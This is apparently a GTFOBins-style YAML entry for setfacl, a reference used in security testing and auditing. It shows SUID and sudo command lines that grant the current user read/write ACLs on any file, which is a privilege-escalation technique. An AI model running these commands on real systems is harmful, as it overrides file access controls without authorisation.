---
description: This can be run with elevated privileges to change ownership and then read, write, or execute a file.
functions:
  suid:
    - code: |
        LFILE=file_to_change
        ./setfacl -m u:$(id -un):rw $LFILE
  sudo:
    - code: |
        LFILE=file_to_change
        sudo setfacl -m -u:$(id -un):rw $LFILE
---
